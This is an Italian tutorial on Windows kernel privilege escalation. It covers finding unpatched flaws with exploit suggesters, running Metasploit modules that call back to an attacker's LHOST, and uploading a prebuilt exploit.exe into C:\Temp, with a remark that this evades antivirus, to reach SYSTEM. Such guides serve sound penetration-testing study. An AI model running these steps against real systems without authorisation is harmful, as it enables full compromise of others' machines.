
# Windows Kernel Exploit

Il kernel è il cuore del sistema operativo. In un sistema Windows, il kernel prende il nome di **Windows NT** e gestisce l’accesso diretto alle risorse di sistema e all’hardware. Funziona come un intermediario tra il software e le componenti fisiche, consentendo ai programmi di interagire in modo sicuro con la memoria, il processore, i dispositivi, ecc.

Windows distingue due modalità operative:

- **User Mode**: modalità con accesso limitato alle risorse. Le applicazioni comuni vengono eseguite qui, in uno spazio isolato per motivi di sicurezza.
- **Kernel Mode**: modalità privilegiata, con accesso illimitato alle risorse. Qui operano i driver, il gestore della memoria, il file system e tutte le funzioni di basso livello.

L’obiettivo di un **Windows Kernel Exploit** è sfruttare una vulnerabilità nella modalità kernel per passare da un utente con privilegi limitati a uno con privilegi **SYSTEM**, ottenendo così il controllo totale sul sistema.

 Attenzione: interagire direttamente con il kernel è pericoloso. Un errore può causare crash di sistema, perdita di dati o BSOD. 

## Fasi di exploit

### 1. Rilevamento delle vulnerabilità

Ogni sistema Windows può presentare vulnerabilità diverse, in base alla versione del sistema operativo, al livello di patch applicate e alle configurazioni installate.

Per identificare queste vulnerabilità, possiamo usare:

- `post/multi/recon/local_exploit_suggester` di Metasploit
- `Windows Exploit Suggester` (WES) scaricabile da <a haref="https://github.com/AonCyberLabs/Windows-Exploit-Suggester">GitHub</a>

WES è uno script Python che confronta le informazioni raccolte con `systeminfo` sul target con un database di bollettini Microsoft, identificando patch mancanti ed eventuali exploit associati. Può anche indicare se esistono:

- moduli Metasploit ([M])
- exploit pubblici ([E])
- vulnerabilità senza bollettino ufficiale ([*])

Il simbolo **[M]** indica che esiste un modulo già pronto su Metasploit.  
Il simbolo **[E]** fa riferimento a un exploit disponibile in forma di **proof-of-concept** (PoC), solitamente scaricabile da siti come Exploit-DB.  
Il simbolo **[*]** indica che manca un bollettino ufficiale (ad esempio, vulnerabilità zero-day note ma non ancora pubblicate da Microsoft).

Un’altra ottima risorsa è la repository:

https://github.com/SecWiki/windows-kernel-exploits

Questa raccoglie centinaia di exploit per il kernel di Windows, organizzati per CVE. Ogni exploit è fornito con codice sorgente o binari compilati pronti all’uso.

### 2. Esecuzione via Metasploit

Dopo aver identificato un exploit tramite `local_exploit_suggester`, puoi eseguirlo direttamente in Metasploit:

`use <nome_modulo>` <br>
`set SESSION <numero_sessione>` <br>
`set LHOST <tuo_IP>` <br>
`set LPORT <porta>` <br>
`run` <br>

Per usare `local_exploit_suggester`:

1. Ottieni una sessione Meterpreter
2. Esegui `background` per metterla in pausa
3. Lancia:

`use post/multi/recon/local_exploit_suggester` <br>
`set SESSION <id_sessione>` <br>
`run` <br>

### 3. Esecuzione manuale

Puoi anche eseguire exploit manualmente. Ecco i passaggi:

1. Clona la repository:

`git clone https://github.com/AonCyberLabs/Windows-Exploit-Suggester` <br>
`cd Windows-Exploit-Suggester` <br>

2. Aggiorna il database:

`./windows-exploit-suggester.py --update`

3. Ottieni le informazioni del target:
- Vai su una shell del target e digita:

`systeminfo > systeminfo.txt`

4. Copia `systeminfo.txt` sulla tua macchina, poi esegui:

`./windows-exploit-suggester.py --database 2024-*.xls --systeminfo systeminfo.txt`


Ti verrà restituita una lista di vulnerabilità, ordinata per probabilità di successo.

Se decidi di usare un exploit da ExploitDB o dalla repo SecWiki:

- Trasferisci il binario sul target con Meterpreter:

`cd C:\` <br>
`ls` <br>
`cd Temp\` <br>
`upload ~/Downloads/exploit.exe` <br>
`shell` <br>
`exploit.exe` <br>

La cartella `Temp` viene usata per evitare di scrivere nella home dell’utente ed eludere possibili controlli o antivirus.

Una volta eseguito l’exploit, controlla i privilegi ottenuti:

`whoami`

Se la risposta è `NT AUTHORITY\SYSTEM`, l’elevazione è riuscita.

---
